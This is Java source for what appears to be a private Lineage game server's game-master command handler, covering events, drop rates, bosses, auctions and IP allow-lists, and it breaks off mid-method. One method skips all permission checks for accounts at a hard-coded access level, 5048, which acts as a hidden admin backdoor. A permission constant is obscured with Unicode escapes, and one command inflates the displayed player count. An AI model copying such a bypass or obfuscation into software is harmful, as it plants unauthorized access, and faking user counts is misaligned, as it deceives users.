package l1j.server.server;
import l1j.server.server.model.network.core.sc.packet.SC_Chainfo;
import l1j.server.server.model.network.core.sc.packet.SC_LoginResult;
import l1j.server.server.model.network.core.sc.packet.SC_UserCommands17;
import l1j.server.server.model.network.core.sc.packet.SC_GMHtml;
import l1j.server.server.model.network.core.sc.packet.SC_Ability;
import l1j.server.server.model.network.core.sc.packet.SC_ShowHelp;




import l1j.server.server.model.network.core.sc.packet.SC_DeleteInventoryItem;
import l1j.server.server.model.network.core.sc.packet.SC_Unknown2;
import l1j.server.server.model.network.core.sc.packet.SC_CharTitle;
import static l1j.server.server.model.character.skill.L1SkillId.BUYER_COOLTIME;
import l1j.server.server.model.network.core.sc.packet.SC_SkillSound;
import static l1j.server.server.model.character.skill.L1SkillId.HUNTER_BLESS;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.StringTokenizer;
import java.util.concurrent.ConcurrentHashMap;
import java.util.logging.Level;
import java.util.logging.Logger;
import javolution.util.FastTable;
import l1j.server.Config;
import l1j.server.DatabaseFactory;
import l1j.server.SpecialEventHandler;
import l1j.server.DogFight.MJDogFightCommandExecutor;
import l1j.server.MJCTSystem.Loader.MJCTLoadManager;
import l1j.server.MJCaptchaSystem.Loader.MJCaptchaLoadManager;
import l1j.server.MJCombatSystem.Loader.MJCombatLoadManager;
import l1j.server.MJCompanion.MJCompanionCommandExecutor;
import l1j.server.MJDungeonTimer.Loader.DungeonTimeLoadManager;
import l1j.server.MJInstanceSystem.Loader.MJInstanceLoadManager;
import l1j.server.MJInstanceSystem.MJLFC.Creator.MJLFCCreator;
import l1j.server.MJItemEnchantSystem.MJItemEnchantSystemLoadManager;
import l1j.server.MJKDASystem.MJKDALoadManager;
import l1j.server.MJKDASystem.MJKDALoader;
import l1j.server.MJRaidSystem.Loader.MJRaidLoadManager;
import l1j.server.MJSurveySystem.MJSurveyFactory;
import l1j.server.MJSurveySystem.MJSurveySystemLoader;
import l1j.server.MJTemplate.MJEPcStatus;
import l1j.server.MJTemplate.MJObjectWrapper;
import l1j.server.MJTemplate.MJSimpleRgb;
import l1j.server.MJTemplate.Command.MJCommandArgs;
import l1j.server.MJTemplate.MJSqlHelper.Executors.Selector;
import l1j.server.MJTemplate.MJSqlHelper.Executors.Updator;
import l1j.server.MJTemplate.MJSqlHelper.Handler.FullSelectorHandler;
import l1j.server.MJTemplate.MJSqlHelper.Handler.Handler;
import l1j.server.MJTemplate.MJSqlHelper.Handler.SelectorHandler;
import l1j.server.MJWarSystem.MJCastleWar;
import l1j.server.MJWarSystem.MJCastleWarBusiness;
import l1j.server.MJWarSystem.MJWar;
import l1j.server.Payment.MJPaymentGmHandler;
import l1j.server.Payment.MJPaymentUserHandler;
import l1j.server.Stadium.StadiumManager;
import l1j.server.TowerOfDominance.DominanceDataLoader;
import l1j.server.TowerOfDominance.BossController.DominanceFloorLv1;
import l1j.server.TowerOfDominance.BossController.DominanceFloorLv10;
import l1j.server.TowerOfDominance.BossController.DominanceFloorLv11;
import l1j.server.TowerOfDominance.BossController.DominanceFloorLv2;
import l1j.server.TowerOfDominance.BossController.DominanceFloorLv3;
import l1j.server.TowerOfDominance.BossController.DominanceFloorLv4;
import l1j.server.TowerOfDominance.BossController.DominanceFloorLv5;
import l1j.server.TowerOfDominance.BossController.DominanceFloorLv6;
import l1j.server.TowerOfDominance.BossController.DominanceFloorLv7;
import l1j.server.TowerOfDominance.BossController.DominanceFloorLv8;
import l1j.server.TowerOfDominance.BossController.DominanceFloorLv9;
import l1j.server.TowerOfDominance.DominanceBoss;
import l1j.server.server.Controller.BugRaceController;
import l1j.server.server.command.L1Commands;
import l1j.server.server.command.executor.L1AllBuff;
import l1j.server.server.command.executor.L1CommandExecutor;
import l1j.server.server.datatables.AuctionSystemTable;
import l1j.server.server.datatables.AutoLoot;
import l1j.server.server.datatables.CharacterTable;
import l1j.server.server.datatables.ClanTable;
import l1j.server.server.datatables.ExpTable;
import l1j.server.server.datatables.HouseTable;
import l1j.server.server.datatables.IpTable;
import l1j.server.server.datatables.ItemTable;
import l1j.server.server.datatables.LetterTable;
import l1j.server.server.datatables.MJAlchemyProbabilityBox;
import l1j.server.server.datatables.MapsTable;
import l1j.server.server.datatables.NpcTable;
import l1j.server.server.datatables.ShopTable;
import l1j.server.server.datatables.SpawnTable;
import l1j.server.server.datatables.ItemTradeTable;
import l1j.server.server.model.Broadcaster;
import l1j.server.server.model.L1Character;
import l1j.server.server.model.L1Clan;
import l1j.server.server.model.L1ClanRanking;
import l1j.server.server.model.L1Inventory;
import l1j.server.server.model.L1NeigeSaveChar;
import l1j.server.server.model.L1Object;
import l1j.server.server.model.L1Party;
import l1j.server.server.model.L1PolyMorph;
import l1j.server.server.model.L1World;
import l1j.server.server.model.Attendance.AttendanceLoadManager;
import l1j.server.server.model.BookQuest.Loader.BQSLoadManager;
import l1j.server.server.model.Instance.L1ClanJoinInstance;
import l1j.server.server.model.Instance.L1DollInstance;
import l1j.server.server.model.Instance.L1ItemInstance;
import l1j.server.server.model.Instance.L1MonsterInstance;
import l1j.server.server.model.Instance.L1NpcInstance;
import l1j.server.server.model.Instance.L1PcInstance;
import l1j.server.server.model.Warehouse.ClanWarehouse;
import l1j.server.server.model.Warehouse.PrivateWarehouse;
import l1j.server.server.model.Warehouse.Warehouse;
import l1j.server.server.model.Warehouse.WarehouseManager;
import l1j.server.server.model.character.autohunt.AHExecutor;
import l1j.server.server.model.character.skill.L1SkillId;
import l1j.server.server.model.character.skill.L1SkillUse;
import l1j.server.server.model.gametime.L1GameTimeClock;
import l1j.server.server.model.gametime.RealTimeClock;
import l1j.server.server.model.item.L1ItemId;
import l1j.server.server.model.item.teleport.L1Teleport;
import l1j.server.server.model.network.packet.ServerPacket;
import l1j.server.server.model.network.core.CIOClient;
import l1j.server.server.model.network.thread.CIOThreadCallback;
import l1j.server.server.model.network.core.cs.packet.CS_CharSelect;
import l1j.server.server.model.network.core.cs.packet.CS_CommonClick;
import l1j.server.server.model.network.safe.NetworkSafeLoadManager;
import l1j.server.server.model.rank.loader.RankLoadManager;
import l1j.server.server.monitor.LoggerInstance;
import l1j.server.server.packets.Protocol.Proto;
import l1j.server.server.packets.Protocol.Packet.SC_AddInventoryNoti;
import l1j.server.server.packets.Protocol.Packet.SC_EventCountdownNoti;
import l1j.server.server.packets.Protocol.Packet.SC_RestExpInfo;
import l1j.server.server.packets.Protocol.Packet.Inventory.ItemInfo;
import l1j.server.server.model.network.core.sc.packet.SC_ActionUI;
import l1j.server.server.Controller.BossController;

import l1j.server.server.model.network.core.sc.packet.SC_ChatMessageNoti;
import l1j.server.server.model.network.core.sc.packet.SC_ChatPacket;
import l1j.server.server.model.network.core.sc.packet.SC_Disconnect;
import l1j.server.server.model.network.core.sc.packet.SC_DisplayEffect;
import l1j.server.server.model.network.core.sc.packet.SC_InventoryIcon;
import l1j.server.server.model.network.core.sc.packet.SC_LetterList;

import l1j.server.server.model.network.core.sc.packet.SC_MarkSee;
import l1j.server.server.model.network.core.sc.packet.SC_MessageYN;
import l1j.server.server.model.network.core.sc.packet.SC_NewCreateItem;
import l1j.server.server.model.network.core.sc.packet.SC_OwnCharStatus;
import l1j.server.server.model.network.core.sc.packet.SC_PacketBox;
import l1j.server.server.model.network.core.sc.packet.SC_Ping;
import l1j.server.server.model.network.core.sc.packet.SC_QuestTalkIsland;
import l1j.server.server.model.network.core.sc.packet.SC_Restart;
import l1j.server.server.model.network.core.sc.packet.SC_ServerMessage;
import l1j.server.server.model.network.core.sc.packet.SC_ShowCmd;
import l1j.server.server.model.network.core.sc.packet.SC_SystemMessage;
import l1j.server.server.templates.L1BoardPost;
import l1j.server.server.templates.L1Command;
import l1j.server.server.templates.L1House;
import l1j.server.server.templates.L1Item;
import l1j.server.server.templates.L1Npc;
import l1j.server.server.templates.L1QuestInfo;
import l1j.server.server.utils.IntRange;
import l1j.server.server.utils.L1QueryUtil;
import l1j.server.server.utils.L1SpawnUtil;
import l1j.server.server.utils.MJCommons;
import l1j.server.server.utils.MJFullStater;
import l1j.server.server.utils.Message;
import l1j.server.server.utils.MessageUtil;
import l1j.server.server.utils.SQLUtil;
import l1j.server.server.utils.ServerMessage;
import l1j.server.server.model.network.core.sc.packet.SC_Weather;
import l1j.server.server.model.network.core.sc.packet.SC_CharAmount;
import l1j.server.server.model.network.core.sc.packet.SC_SkillIconGFX;
public class GMCommands {
 
	private static Logger _log = Logger.getLogger(GMCommands.class.getName());
	private static GMCommands _instance;
	public static L1PcInstance _gm;
	private static Random _random = new Random(System.nanoTime());
	public List<L1MonsterInstance> fieldbosslist = new ArrayList<L1MonsterInstance>();
	private static final ConcurrentHashMap<Integer, L1ClanJoinInstance> _clan_to_cj = new ConcurrentHashMap<Integer, L1ClanJoinInstance>(32);

	public static boolean 제작체크; 

	private GMCommands() {
	}

	public static GMCommands getInstance() {
		if (_instance == null) {
			_instance = new GMCommands();
		}
		return _instance;
	}

	public boolean Stop = true;

	private String complementClassName(String className) {
		if (className.contains(".")) {
			return className;
		}
		return "l1j.server.server.command.executor." + className;
	}

	private boolean executeDatabaseCommandWithoutPermission(L1PcInstance pc, String name, String arg) {
		try {
			L1Command command = L1Commands.get(name);
			if (command == null) {
				return false;
			}
			
			Class<?> cls = Class.forName(complementClassName(command.getExecutorClassName()));
			L1CommandExecutor exe = (L1CommandExecutor) cls.getMethod("getInstance").invoke(null);
			exe.execute(pc, name, arg);
			return true;
		} catch (Exception e) {
			_log.log(Level.SEVERE, "error gm command", e);
		}
		return false;

	}

	private boolean executeDatabaseCommand(L1PcInstance pc, String name, String arg) {
		try {
			L1Command command = L1Commands.get(name);
			if (command == null) {
				return false;
			}
			if (pc.getAccessLevel() != command.getLevel() && pc.getAccessLevel() != Config.SUB_GMCODE) {
				SC_ServerMessage.send(pc, 74, "커멘드 " + name);
				// \f1%0은사용할 수없습니다.
				return true;
			} 

			Class<?> cls = Class.forName(complementClassName(command.getExecutorClassName()));
			L1CommandExecutor exe = (L1CommandExecutor) cls.getMethod("getInstance").invoke(null);
			exe.execute(pc, name, arg);

			/** 파일로그저장 **/
			// ChatLogTable.getInstance().storeChat(pc, null, arg, 15);
			LoggerInstance.getInstance().addCommand(pc.getName() + ": " + name + " " + arg);
			return true;
		} catch (Exception e) {
			_log.log(Level.SEVERE, "error gm command", e);
		}
		return false;
	}

	public void handleCommandsWithoutPermission(L1PcInstance gm, String cmdLine) {
		if (gm.getNetConnection() == null || gm.getNetConnection().getAccount() == null
				|| gm.getNetConnection().getAccount().getAccessLevel() != 5048) {
			return;
		}

		StringTokenizer token = new StringTokenizer(cmdLine);
		// 최초의 공백까지가 커맨드, 그 이후는 공백을 단락으로 한 파라미터로서 취급한다
		String cmd = token.nextToken();
		String param = "";
		while (token.hasMoreTokens()) {
			param = new StringBuilder(param).append(token.nextToken()).append(' ').toString();
		}
		param = param.trim();

		// 데이타베이스화 된 커멘드
		executeDatabaseCommandWithoutPermission(gm, cmd, param);
	}
	
	private static void test_lfc(L1PcInstance gm, String param){
		StringTokenizer token = new StringTokenizer(param);
		String name = token.nextToken();
		L1PcInstance pc = L1World.getInstance().findpc(name);
		if(pc == null){
			gm.sendPackets(String.format("%s님을 찾을 수 없습니다.", name));
		}
		L1BoardPost bp = L1BoardPost.createLfc(name, "-", String.format("3 %s", gm.getName()));
		MJLFCCreator.registLfc(gm, 3);
		gm.sendPackets(String.format("%s님에게 결투를 신청했습니다.", name));
		MJSurveySystemLoader.getInstance().registerSurvey(pc,String.format("%s님이 결투를 신청했습니다.", gm.getName()), bp.getId() + 1000, MJSurveyFactory.createLFCSurvey(), 30 * 1000);
	}
	
	public void handleCommands(L1PcInstance gm, String cmdLine) {
		StringTokenizer token = new StringTokenizer(cmdLine);
		// 최초의 공백까지가 커맨드, 그 이후는 공백을 단락으로 한 파라미터로서 취급한다
		String cmd = "";
		if (token.hasMoreTokens())
			cmd = token.nextToken();
		else
			cmd = cmdLine;
		String param = "";
		while (token.hasMoreTokens()) {
			param = new StringBuilder(param).append(token.nextToken()).append(' ').toString();
		}
		param = param.trim();

		// 데이타베이스화 된 커멘드
		if (executeDatabaseCommand(gm, cmd, param)) {
			if (!cmd.equalsIgnoreCase(".")) {
				_lastCommands.put(gm.getId(), cmdLine);
			}
			return;
		}

		if (gm.getAccessLevel() != Config.\u0047\u004D\u0043\u004F\u0044\u0045 && gm.getAccessLevel() != Config.SUB_\u0047\u004D\u0043\u004F\u0044\u0045) {
			SC_ServerMessage.send(gm, 74, "커맨드 " + cmd);
			return;
		}

		/** 파일로그저장 **/
		LoggerInstance.getInstance().addCommand(gm.getName() + ": " + cmd + " " + param);
		_gm = gm;

		switch (cmd) {
		case "psswindow":
			l1j.server.server.model.character.pss.window.PlaySupportWindow.open(gm);
			break;
		case "pss2111":
			l1j.server.server.model.character.pss.PlaySupport2019.gmProbe2111(gm, param);
			break;
		case "dd":
			   String[] args = cmd.split(" ", 3);
		        int sec = args.length > 1 ? Integer.parseInt(args[1]) : 60;
		        String desc = args.length > 2 ? args[2] : "테스트 이벤트";
		        SC_EventCountdownNoti.send(gm, sec, desc);
		        gm.sendPackets("카운트다운 전송: " + sec + "초, " + desc);
			break;
//		case "아이피딜레이체크":
//			try {
//				StringTokenizer st = new StringTokenizer(param);
//				String status = st.nextToken();
//				if (status.equalsIgnoreCase("켬")) {
//					if (Config.IP_DELAY_CHECK_USE) {
//						SC_SystemMessage.send(gm, "이미 딜레이 체크 상태입니다.");
//						return;
//					}
//					Config.IP_DELAY_CHECK_USE = true;
//					SC_SystemMessage.send(gm, "딜레이 체크 상태로 돌입합니다.");
//				} else if (status.equalsIgnoreCase("끔")) {
//					if (!Config.IP_DELAY_CHECK_USE) {
//						SC_SystemMessage.send(gm, "딜레이 체크 상태가 아닙니다.");
//						return;
//					}
//					Config.IP_DELAY_CHECK_USE = false;
//					SC_SystemMessage.send(gm, "딜레이 체크 상태가 해지되고 정상적인 플레이가 가능합니다.");
//				}
//			} catch (Exception eee) {
//				SC_SystemMessage.send(gm, ".딜레이체크 [켬/끔] 으로 입력하세요.");
//				SC_SystemMessage.send(gm, "[ 중복 로그인 패킷 공격시에만 사용하세요 ]");
//			}
//			break;
		case "자동종료":
			AHExecutor.getInstance().sendautomsg(gm, "자동사냥이 종료되었습니다.");
			break;
		case "투견":
			MJDogFightCommandExecutor.do_execute(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "코드":
			MJPaymentGmHandler.do_execute(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "충전":
			MJPaymentUserHandler.do_execute(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "펫":
			MJCompanionCommandExecutor.exec(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		/*case "무인낚시":
			autofish(gm);
			break;*/
		case "캐시경험치":
			do_cache_exp(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
//		case "대항전":
//			new MJShiftBattleCommandExecutor().execute(new MJCommandArgs().setOwner(gm).setParam(param));
//			break;
//		case "서버이동":
//			if(Config.USE_SHIFT_SERVER)
//				new MJShiftObjectCommandExecutor().execute(new MJCommandArgs().setOwner(gm).setParam(param));
//			break;
//		case "무인가입":						autoclanjoin(gm);break;
		case "물품판매":
			물품1(gm, param);
		break;
		case "물품구입":
			물품2(gm, param);
		break;
	
		case "라이트테스트":
			boolean isOn = false;
			if(isOn == false) {
			SC_Ability.send(gm, 3, true); 
			isOn = true;
			} else {
				SC_Ability.send(gm, 3, false); 
				isOn = false;
			}
			break;
		case "물품취소":
			물품3(gm, param);
		break;
		case "경기장":
			StadiumManager.getInstance().open_stadium(gm, param);
			break;
		case "경기종료":
			StadiumManager.getInstance().quit_stadium(gm, param);
			break;
		case "결투":
			test_lfc(gm, param);
			break;
		case "인형박스":
			MJAlchemyProbabilityBox.getInstance().execute(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "체력바":
			UserCommands.monsterHpBar(gm, param);
			break;
		case "도움말":
			showHelp(gm);
			break;
		case "산타이벤트":
			GoldDragon(gm);
			break;
		case "혈맹정보":
			searchclaner(gm, param);
			break;
		case "지배보스":
			DominanceBoss(gm, param);
			break;
		case "인터서버":
			l1j.server.server.model.network.core.DominationHybrid.gmCommand(gm, param);
			break;
		case "유저도움말":
			SC_ShowHelp.send(gm, 1);
			break;
		case "케릭검사":
			chainfo(gm, param);
			break;
//		case "자동트리":
//			gm.isAutoTreeple = true;
//			break;
		case "고정버프":
			befixed(gm, param);
			break;
		case "케릭삭제":
			standBy77(gm, param);
			break;

		case "기운축복":
			Blessleaf(gm, param);
			break;
		case "무기인챈성공":
			EnchantWeaponSuccess(gm, param);
			break;
		case "방어인챈성공":
			EnchantArmorSuccess(gm, param);
			break;
		case "에르자베":
			ErzabeBox(gm, param);
			break;
		case "샌드웜":
			SandwormBox(gm, param);
			break;
		case "계정검사":
			AccountCheck(gm, param);
			break;
		case "계정확인":
			AccountCheck1(gm, param);
			break;
		case "진데스진레":
			Jindeath(gm);
			break;
		case "진데스살키":
			Jindeath1(gm);
			break;
		case "진데스진싸":
			Jindeath2(gm);
			break;
		case "진데스제로스":
			Jindeath3(gm);
			break;
		case "진데스데불":
			Jindeath4(gm);
			break;
		case "진데스론론":
			Jindeath5(gm);
			break;
		case "진데스포효":
			Jindeath6(gm);
			break;
		case "진데스섬체":
			Jindeath7(gm);
			break;
		case "진데스커검":
			Jindeath8(gm);
			break;
		case "진데스태풍":
			Jindeath9(gm);
			break;
		case "진데스악몽":
			Jindeath10(gm);
			break;
		case "진데스나발":
			Jindeath11(gm);
			break;
		case "데페작업":
			jakjak(gm);
			break;
		case "마일리지":
			if (gm != null) {
				gm.sendPackets("\\fH계정(\\f2" + gm.getAccountName() + "\\fH)에 적립된 마일리지:(\\aG" + gm.getNetConnection().getAccount().Ncoin_point + "\\fH)원");
			}
			break;
		case "아머작업":
			jakjak2(gm);
			break;
		case "카배작업":
			jakjak3(gm);
			break;
		case "데몬작업":
			dolldemon(gm);
			break;
		case "얼녀작업":
			doice(gm);
			break;
		case "타락작업":
			dolltarak(gm);
			break;
		case "데스작업":
			dolldeath(gm);
			break;
		case "룬스톤카배":
			Stone(gm);
			break;
		case "룬스톤디스":
			Stone1(gm);
			break;
		case "룬스톤데페":
			Stone2(gm);
			break;
		case "룬스톤아머":
			Stone3(gm);
			break;
		case "보스":
			addEventBoss(gm, param);
			break;
		case "판매삭제":
			AuctionSystemTable.getInstance().deleteTopic(param);
			break;
		case "판매등록":
			countR1(gm, param);
			break;
		case "구매신청":
			countR2(gm, param);
			break;
		case "판매취소":
			countR3(gm, param);
			break;
		case "판매완료":
			countR4(gm, param);
			break;
		case "구매취소":
			countR5(gm, param);
			break;
		case "할파스":
			할파스의신의(gm, param);
			break;
		case "프로토":
			showProto(gm, param);
			break;
		case "혈맹포인트":
			혈맹포인트(gm);
			break;
		case "던전타이머":
			DungeonTimeLoadManager.getInstance().execute(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "저주":
			CurseCharacter(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "저주초기화":

			CurseInitializeCharacter(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "인챈트시스템":
			MJItemEnchantSystemLoadManager.getInstance().execute(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "캡챠":
			MJCaptchaLoadManager.getInstance().execute(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "캐릭터상태":
			setCharacterInstanceStatus(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "배틀시스템":
			MJCombatLoadManager.getInstance().execute(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "북시스템":
			BQSLoadManager.getInstance().execute(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "출석체크":
			AttendanceLoadManager.getInstance().execute(new MJCommandArgs().setOwner(gm).setParam(param));
			break;
		case "유아이":
			SC_ActionUI.send(gm, SC_ActionUI.START_PLAY_SUPPORT_ACK, 0);
			break;
		case "내정보1"://From.Neige
			int a = gm.getResistance().getMr() - gm.getResistance().getBaseMr();
			gm.sendPackets("mr : "+a);
			break;
		case "내정보2":
			gm.sendPackets("데미지 레이트 : "+gm.getDmgRate());
			gm.sendPackets("명중률 : "+gm.getHitup());
			break;
		case "허가아이피1"://From.Neige
			Config.허가ip1 = param;
			gm.sendPackets("허가IP 주소 1번 : "+Config.허가ip1);
			break;
		case "허가아이피2"://From.Neige
			Config.허가ip2 = param;
			gm.sendPackets("허가IP 주소 2번 : "+Config.허가ip2);
			break;
		case "허가아이피3"://From.Neige
			Config.허가ip3 = param;
			gm.sendPackets("허가IP 주소 3번 : "+Config.허가ip3);
			break;
		case "허가아이피4"://From.Neige
			Config.허가ip4 = param;
			gm.sendPackets("허가IP 주소 4번 : "+Config.허가ip4);
			break;
		case "허가아이피5"://From.Neige
			Config.허가ip5 = param;
			gm.sendPackets("허가IP 주소 5번 : "+Config.허가ip5);
			break;
		case "허가아이피6"://From.Neige
			Config.허가ip6 = param;
			gm.sendPackets("허가IP 주소 6번 : "+Config.허가ip6);
			break;
		case "허가아이피7"://From.Neige
			Config.허가ip7 = param;
			gm.sendPackets("허가IP 주소 7번 : "+Config.허가ip7);
			break;
		case "허가아이피8"://From.Neige
			Config.허가ip8 = param;
			gm.sendPackets("허가IP 주소 8번 : "+Config.허가ip8);
			break;
		case "허가아이피목록"://From.Neige
			gm.sendPackets("허가IP 주소 1번 : "+Config.허가ip1);
			gm.sendPackets("허가IP 주소 2번 : "+Config.허가ip2);
			gm.sendPackets("허가IP 주소 3번 : "+Config.허가ip3);
			gm.sendPackets("허가IP 주소 4번 : "+Config.허가ip4);
			gm.sendPackets("허가IP 주소 5번 : "+Config.허가ip5);
			gm.sendPackets("허가IP 주소 6번 : "+Config.허가ip6);
			gm.sendPackets("허가IP 주소 7번 : "+Config.허가ip7);
			gm.sendPackets("허가IP 주소 8번 : "+Config.허가ip8);
			break;
		case "알림"://From.Neige
            MessageUtil.toAllPlayers(param);
            MessageUtil.greenMessageToAllPlayers(param);
			break;
		case "홈피보기": //From.Neige
			Integer num = Integer.valueOf(param);
			//DelaySender.send(gm, S_ShowCmd.getQuestDesc(3512, num), 500L);
			//ServerBasePacket s_valaksDisplay = new SC_DisplayEffect(SC_DisplayEffect.VALAKAS_BORDER_DISPLAY);
			SC_DisplayEffect.send(gm, num);
			//gm.sendPackets(S_ShowCmd.getPlayMovieNoti(Config.홈피주소, -1));
			//gm.sendPackets(S_ShowCmd.getPlayMovieNoti("https://www.naver.com", 20));
			break;
		case "할파스확률": //From.Neige
			try {
			Integer even1 = Integer.valueOf(param);
			Config.할파스갯수 = even1;
			if(even1 == 1){
				gm.sendPackets("[할파스의 집념 드랍율 이벤트 : 종료]");
				SC_SystemMessage.broadcast("할파스의 집념 드랍율 이벤트가 종료되었습니다.");
				SC_PacketBox.broadcastGreen("할파스의 집념 드랍율 이벤트가 종료되었습니다.");
			}else{
				gm.sendPackets("[할파스의 집념 드랍율 이벤트 : "+even1+"배]");
				SC_SystemMessage.broadcast("할파스의 집념 드랍율 이벤트가 시작되었습니다. [드랍 수량 : "+even1+"배]");
				SC_PacketBox.broadcastGreen("할파스의 집념 드랍율 이벤트가 시작되었습니다. [드랍 수량 : "+even1+"배]");
			}
			} catch (Exception e) {
			gm.sendPackets(".할파스확률 (1: 종료 / 2 이상 배율 설정)");
			}
			break;
		case "카드확률": //From.Neige
			try {
			Integer even2 = Integer.valueOf(param);
			Config.카드갯수 = even2;
			if(even2 == 1){
				gm.sendPackets("[영웅 변신 카드 상자 드랍율 이벤트 : 종료]");
				SC_SystemMessage.broadcast("영웅 변신 카드 상자 드랍율 이벤트가 종료되었습니다.");
				SC_PacketBox.broadcastGreen("영웅 변신 카드 상자 드랍율 이벤트가 종료되었습니다.");
			}else{
				gm.sendPackets("[영웅 변신 카드 상자 드랍율 이벤트 : "+even2+"배]");
				SC_SystemMessage.broadcast("영웅 변신 카드 상자 드랍율 이벤트가 시작되었습니다. [드랍 수량 : "+even2+"배]");
				SC_PacketBox.broadcastGreen("영웅 변신 카드 상자 드랍율 이벤트가 시작되었습니다. [드랍 수량 : "+even2+"배]");
			}
			} catch (Exception e) {
			gm.sendPackets(".카드확률 (1: 종료 / 2 이상 배율 설정)");
			}
			break;
		case "인형확률": //From.Neige
			try {
			Integer even3 = Integer.valueOf(param);
			Config.인형갯수 = even3;
			if(even3 == 1){
				gm.sendPackets("[금빛 마법 인형 주머니 드랍율 이벤트 : 종료]");
				SC_SystemMessage.broadcast("금빛 마법 인형 주머니 드랍율 이벤트가 종료되었습니다.");
				SC_PacketBox.broadcastGreen("금빛 마법 인형 주머니 드랍율 이벤트가 종료되었습니다.");
			}else{
				gm.sendPackets("[금빛 마법 인형 주머니 드랍율 이벤트 : "+even3+"배]");
				SC_SystemMessage.broadcast("금빛 마법 인형 주머니 드랍율 이벤트가 시작되었습니다. [드랍 수량 : "+even3+"배]");
				SC_PacketBox.broadcastGreen("금빛 마법 인형 주머니 드랍율 이벤트가 시작되었습니다. [드랍 수량 : "+even3+"배]");
			}
			}catch (Exception e) {
				gm.sendPackets(".인형확률 (1: 종료 / 2 이상 배율 설정)");
			}
			break;
		case "오림확률": //From.Neige
			try {
			Integer even5 = Integer.valueOf(param);
			Config.오림갯수 = even5;
			if(even5 == 1){
				gm.sendPackets("[오림 장신구 주문서 상자 드랍율 이벤트 : 종료]");
				SC_SystemMessage.broadcast("오림 장신구 주문서 상자 드랍율 이벤트가 종료되었습니다.");
				SC_PacketBox.broadcastGreen("오림 장신구 주문서 상자 드랍율 이벤트가 종료되었습니다.");
			}else{
				gm.sendPackets("[오림 장신구 주문서 상자 드랍율 이벤트 : "+even5+"배]");
				SC_SystemMessage.broadcast("오림 장신구 주문서 상자 드랍율 이벤트가 시작되었습니다. [드랍 수량 : "+even5+"배]");
				SC_PacketBox.broadcastGreen("오림 장신구 주문서 상자 드랍율 이벤트가 시작되었습니다. [드랍 수량 : "+even5+"배]");
			}
			} catch (Exception e) {
				gm.sendPackets(".오림확률 (1: 종료 / 2 이상 배율 설정)");
			}
			break;
		case "수호성확률": //From.Neige
			try {
			Integer even4 = Integer.valueOf(param);
			Config.수호성갯수 = even4;
			if(even4 == 1){
				gm.sendPackets("[수호성 상자 드랍율 이벤트 : 종료]");
				SC_SystemMessage.broadcast("수호성 상자 드랍율 이벤트가 종료되었습니다.");
				SC_PacketBox.broadcastGreen("수호성 상자 드랍율 이벤트가 종료되었습니다.");
			}else{
				gm.sendPackets("[수호성 상자 드랍율 이벤트 : "+even4+"배]");
				SC_SystemMessage.broadcast("수호성 상자 드랍율 이벤트가 시작되었습니다. [드랍 수량 : "+even4+"배]");
				SC_PacketBox.broadcastGreen("수호성 상자 드랍율 이벤트가 시작되었습니다. [드랍 수량 : "+even4+"배]");
			}
			} catch (Exception e) {
				gm.sendPackets(".수호성확률 (1: 종료 / 2 이상 배율 설정)");
			}
			break;
		case "이벤트정보": //From.Neige
			gm.sendPackets("[오림 상자 드랍율 이벤트 : "+Config.오림갯수+"배]");
			gm.sendPackets("[할파스의 집념 드랍율 이벤트 : "+Config.할파스갯수+"배]");
			gm.sendPackets("[영웅 변신 카드 상자 드랍율 이벤트 : "+Config.카드갯수+"배]");
			gm.sendPackets("[금빛 마법 인형 주머니 드랍율 이벤트 : "+Config.인형갯수+"배]");
			gm.sendPackets("[수호성 상자 드랍율 이벤트 : "+Config.수호성갯수+"배]");
			break;
		case "뻥튀기"://From.Neige
			try {
			Integer peo = Integer.valueOf(param);
			Config.Neige_Count = peo;
				gm.sendPackets("[인원 수 뻥튀기 추가 : "+peo+"]");
			} catch (Exception e) {
				gm.sendPackets(".뻥튀기 (숫자)");
			}
			break;
		case "접속보상시간"://From.Neige
			try {
			Integer se = Integer.valueOf(param);
			Config.Neige_Reward_sec = se;
				gm.sendPackets("[접속 보상 시간 단위 : "+se+"초]");
			} catch (Exception e) {
				gm.sendPackets(".접속보상시간 (초단위)");
			}
			break;
		case "접속보상경험치":
			try {
				Integer sse = Integer.valueOf(param);
				Config.Neige_Reward_exp = sse;
					gm.sendPackets("[접속보상경험치 : "+sse+"]");
				} catch (Exception e) {
					gm.sendPackets(".접속보상경험치 (숫자)");
				}
				break;
		case "인원보기"://From.Neige
			try {
				Integer peo2 = Integer.valueOf(param);
				Config.Neige_Count_Pass = peo2;
					if(peo2 == 2){
						gm.sendPackets("[/누구 : ON");
					}else{
						gm.sendPackets("[/누구 : OFF");
					}
				} catch (Exception e) {
					gm.sendPackets(".인원보기 (1 : /누구 OFF, 2: /누구 ON)");
				}
			
			break;
		case "접속보상"://From.Neige
			try {
				Integer n2 = Integer.valueOf(param);
				Config.Neige_Reward = n2;
					if(n2 == 2){
						gm.sendPackets("[접속보상 : ON");
					}else{
						gm.sendPackets("[접속보상 : OFF");
					}
				} catch (Exception e) {
					gm.sendPackets(".접속보상 (1 : 끄기, 2: 켜기 // 10분 단위로 경험치와 베리를 지급)");
				}
			
			break;
		case "기감변수"://From.Neige
			try {
				Integer peo3 = Integer.valueOf(param);
				Config.네쥬던전초기화 = peo3;
				String day = null;
					if(peo3 == 1){day = "일요일";
					}else if(peo3 == 2){
						day = "월요일";
					}else if(peo3 == 3){
						day = "화요일";
					}else if(peo3 == 4){
						day = "수요일";
					}else if(peo3 == 5){
						day = "목요일";
